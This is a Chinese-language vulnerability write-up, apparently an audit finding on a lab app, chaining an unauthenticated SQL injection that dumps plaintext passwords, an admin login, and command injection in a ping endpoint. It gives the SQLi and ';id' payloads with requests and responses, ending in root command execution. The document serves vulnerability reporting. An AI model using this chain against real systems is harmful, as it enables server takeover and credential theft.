---
title: 匿名 SQLi 泄露 admin 凭据 → 登录 → ping 命令注入 RCE
summary: 匿名用户通过未授权 SQLi 拖取 admin 明文密码，登录获取 admin 会话后利用 ping 接口命令注入实现 RCE，从匿名访问到完全控制服务器。
vuln_ids:
- 183
- 184
---

## 攻击链：匿名 SQLi → admin 登录 → ping 命令注入 RCE

### 前提
- 漏洞 183（SQLi）：`GET /api/users?name=` 无鉴权，`name` 参数字符串拼接到 SQL，SELECT 含 `password` 字段。
- 漏洞 184（RCE）：`GET /api/tools/ping?host=` 需 admin 会话（`session["role"]=="admin"`），`host` 参数拼入 `subprocess.getoutput(f"echo MEMO-PING {host}")`。
- 串联关键：SQLi 泄露的 admin 明文密码可通过 `POST /api/login` 的 `find_user()` 参数化校验（store.py:10-16），登录后 Flask session 设置 `session["name"]="admin"` + `session["role"]="admin"`，满足 ping 接口的鉴权前提。

### Step 1 — 匿名 SQLi 拖取 admin 密码（漏洞 183）

匿名发送：
```
GET /api/users?name=' OR 1=1 -- HTTP/1.1
Host: TARGET:5000
```

源码路径（app.py:63-70 → engine.py:69-74）：
- `api_users()` 无鉴权，`name` 参数传入 `run_user_lookup(name)`
- `run_user_lookup` 执行 `SELECT id, name, role, email, password FROM users WHERE name = '' OR 1=1 --'`
- WHERE 恒真，返回所有用户记录，含 `password` 字段

响应：
```json
{"users":[
  {"id":1,"name":"alice","role":"user","email":"alice@memoboard.lab","password":"alice123"},
  {"id":2,"name":"bob","role":"user","email":"bob@memoboard.lab","password":"bob123"},
  {"id":3,"name":"admin","role":"admin","email":"admin@memoboard.lab","password":"admin123"}
]}
```

攻击者获得 admin 明文密码 `admin123`。

### Step 2 — 登录获取 admin 会话

用泄露的凭据登录：
```
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"admin123"}
```

源码路径（app.py:42-52 → store.py:10-16）：
- `find_user("admin", "admin123")` 参数化查询 `SELECT ... WHERE name=? AND password=?`，匹配成功
- `session["name"]="admin"`, `session["role"]="admin"` 写入 Flask session
- 响应 `200 {"ok":true,"name":"admin","role":"admin"}`，Set-Cookie 下发 session

攻击者获得 admin 会话 cookie。

### Step 3 — ping 命令注入 RCE（漏洞 184）

带 admin session cookie 发送：
```
GET /api/tools/ping?host=;id HTTP/1.1
Cookie: session=<admin_session>
```

源码路径（app.py:97-105 → engine.py:77-79）：
- `api_ping()` 检查 `session.get("name")` 存在（Step 2 已设置）→ 通过 401 检查
- 检查 `session.get("role")=="admin"`（Step 2 已设置）→ 通过 403 检查
- `host=";id"` 传入 `ping_host(";id")`
- `subprocess.getoutput("echo MEMO-PING ;id")` → shell 执行 `echo MEMO-PING` 后执行 `id`
- 命令输出通过 `Response(..., mimetype="text/plain")` 原样返回

响应：
```
MEMO-PING 
uid=0(root) gid=0(root) groups=0(root)
```

### 最终危害

攻击者从**完全匿名**状态出发，仅用 3 个 HTTP 请求（SQLi 拖密码 → 登录 → ping 注入），无需任何受害者交互，即可在服务器上执行任意系统命令，实现**远程代码执行（RCE）**，完全控制服务器。可进一步读取数据库、横向渗透内网、植入持久化后门。
